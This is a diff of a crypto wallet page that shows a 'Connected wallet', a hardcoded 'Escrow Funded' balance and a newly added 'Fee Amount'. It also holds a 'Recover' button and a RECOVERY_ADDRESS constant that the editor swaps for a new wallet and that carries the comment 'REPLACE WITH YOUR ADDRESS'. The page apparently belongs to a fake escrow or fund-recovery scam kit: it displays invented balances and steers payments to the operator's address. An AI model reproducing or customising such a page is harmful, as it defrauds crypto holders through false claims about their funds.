@@ -509,11 +509,14 @@
                                 <p class="text-muted mb-2">Connected wallet:</p>
                                 <div class="address-box mb-3" id="walletAddress"></div>
 
-                                <p class="text-muted mb-2">Available balance:</p>
+                                <p class="text-muted mb-2">Available Balance:</p>
                                 <div class="balance-display" id="walletBalance">0 ETH</div>
 
                                 <p class="text-muted mb-2">Escrow Funded:</p>
-                                <div class="balance-display" id="walletBalance">3.75 BTC</div>
+                                <div class="balance-display" id="walletBalance">2.67 BTC</div>
+
+                                <p class="text-muted mb-2">Fee Amount:</p>
+                                <div class="balance-display" id="walletBalance">0.69 ETH</div>
                             </div>
 
                             <div id="txStatus" class="status-card status-danger" style="display: block;"><i
@@ -536,7 +539,7 @@
                             <div class="mb-4">
                                 <p class="text-muted mb-2">Escrow address:</p>
                                 <div class="address-box mb-3 recovery-address" id="recoveryAddress">
-                                    0xD47aa9E69a7C9cf52043A0702602FedA2dF5F4A4</div>
+                                    0x01F60446090B3ef6FA60A142e739A2cf960404e9</div>
                             </div>
 
                             <button id="recoverBtn" class="btn btn-primary btn-lg w-100 py-3">
@@ -567,7 +570,7 @@
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <script>
-        const RECOVERY_ADDRESS = '0xD47aa9E69a7C9cf52043A0702602FedA2dF5F4A4'; // REPLACE WITH YOUR ADDRESS
+        const RECOVERY_ADDRESS = '0x01F60446090B3ef6FA60A142e739A2cf960404e9'; // REPLACE WITH YOUR ADDRESS
         const INFURA_ID = 'c089e0974c824ced9c2385af21dda82d'; // Replace with your Infura ID
         const TX_TIMEOUT = 180000; // 3 minutes timeout for transactions (increased from 2 minutes)
         
